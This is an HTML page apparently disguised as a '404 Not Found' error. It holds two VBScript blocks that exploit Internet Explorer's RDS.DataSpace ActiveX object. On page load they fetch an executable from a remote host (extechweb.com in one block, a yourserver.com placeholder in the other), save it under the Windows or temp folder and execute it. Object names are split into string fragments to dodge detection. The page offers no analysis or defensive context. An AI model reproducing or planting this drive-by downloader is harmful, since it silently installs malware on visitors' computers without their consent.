 


<HTML xmlns:IE>
<body>


<SCRIPT language="VBScript">
   
Module_Path="http://extechweb.com/get.php?file=exe"

   If navigator.appName="Microsoft Internet Explorer" Then
            
      If InStr(navigator.platform,"Win32") <> 0  Then
      
      Const ssfFONTS=20
      Const adModeReadWrite=3
      Const adTypeBinary=1 
      Const adSaveCreateOverWrite=2 
       
      Dim  oRDS
      Dim  oXMLHTTP
      Dim  oFSO
      Dim  oStream
      Dim  oWShell
      Dim  oShellApp 
      
      Dim  WinDir
      Dim  ExeName
      Dim  XMLBody
      Dim  PluginFile
      Dim  cByte
      Dim   ObjName
      Dim   ObjProg
      
      Randomize

      ExeName=GenerateName()
      ExeName=ExeName & ".exe"

      cls1="clsid:BD96"
      cls2="C556-65A"
      cls3="3-11D0-9"
      cls4="83A-00C04FC29E36"
      clsfull=cls1&cls2&cls3&cls4

      Set  oRDS=document.createElement("object") 
      oRDS.setAttribute "id","oRDS"
      oRDS.setAttribute "classid",clsfull
      
      Set oShellApp = oRDS.CreateObject("Shell.Application","")
      Set oFolder = oShellApp.NameSpace(ssfFONTS)
      Set oFolderItem=oFolder.ParseName("Symbol.ttf")
      Font_Path_Components=Split(oFolderItem.Path,"\",-1,1)
      WinDir= Font_Path_Components(0) & "\" &  Font_Path_Components(1) & "\"
      ExeName=WinDir & ExeName
                  
      ObjName="Microsoft"
      ObjProg="XMLHTTP"
      set oXMLHTTP = CreateObject(ObjName & "." & ObjProg)
      Req_type="G" & "E" & "T"
      HTTPSession=oXMLHTTP.Open(Req_Type,Module_Path,0)
      oXMLHTTP.Send() 
      On Error Resume Next
      XMLBody=oXMLHTTP.responseBody
     
      ObjName="ADODB"
      ObjProg="Stream"
      On Error Resume Next
      Set oStream=oRDS.CreateObject(ObjName & "." & ObjProg,"")
      If Err.number <> 0 Then
         
            Set oFSO=oRDS.CreateObject("Scripting.FileSystemObject","")
            Set PluginFile=oFSO.CreateTextFile(ExeName, TRUE)
            Plugin_size=LenB(XMLBody)

            For j=1 To Plugin_size 
                cByte=MidB(XMLBody,j,1)
                ByteCode=AscB(cByte)
                PluginFile.Write(Chr(ByteCode))
            Next
            PluginFile.Close
       
            Set  oWShell=oRDS.CreateObject("WScript.Shell","")
            On Error Resume Next
            oWShell.Run (ExeName),1,FALSE
      Else
            oStream.Mode=adModeReadWrite
            oStream.Type=adTypeBinary 
            oStream.Open 
            oStream.Write XMLBody 
            oStream.SaveToFile ExeName,adSaveCreateOverWrite
            
            oShellApp.ShellExecute ExeName
      End If
            
            
      End If
   End If   
   
Function GenerateName()
RandomName=""
rr=Int(8*Rnd)
ik=0
Do
  ii=Int(25*Rnd)+97
  RandomName=RandomName+Chr(ii)
  ik=ik+1
Loop While ik<rr
GenerateName=RandomName
End Function

</SCRIPT>

<script language="VBScript">
    on error resume next
    dl = "http://yourserver.com/get.php?file=exe"
    Set df = document.createElement("object")

      cls1="clsid:BD96"
      cls2="C556-65A"
      cls3="3-11D0-9"
      cls4="83A-00C04FC29E36"
      clsfull=cls1&cls2&cls3&cls4


    df.setAttribute "classid",clsfull

    strr1="Mic"
    strr2="roso"
    strr3="ft."
    strr4="XML"
    strr5="HTTP"
    strr=strr1&strr2&strr3&strr4&strr5

    Set x = df.CreateObject(strr,"")
    ab1="A"
    ab2="dod"
    ab3="b.S"
    ab4="t"
    ab5="re"
    ab6="am"
    strb1=ab1&ab2&ab3&ab4&ab5&ab6
    strb5=strb1
    set YY = df.createobject(strb5,"")
    YY.type = 1
    str6="GET"
    x.Open str6, dl, False
    x.Send
    fnamezz1="update.exe"


    scripp1="Scrip"
    scripp2="ting"
    scripp3=".Fil"
    scripp4="eSyste"
    scripp5="mObject"
    scripp=scripp1&scripp2&scripp3&scripp4&scripp5

    set FF = df.createobject(scripp,"")
    set tmp = F.GetSpecialFolder(2)
    fnamezz1= FF.BuildPath(tmp,fnamezz1)


    YY.open
    YY.write x.responseBody
    YY.savetofile fnamezz1,2
    YY.close
    set MM = df.createobject("Shell.Application","")
	MM.ShellExecute fnamezz1,"","","open",0
</script>
404 Not Found

</body>
</html>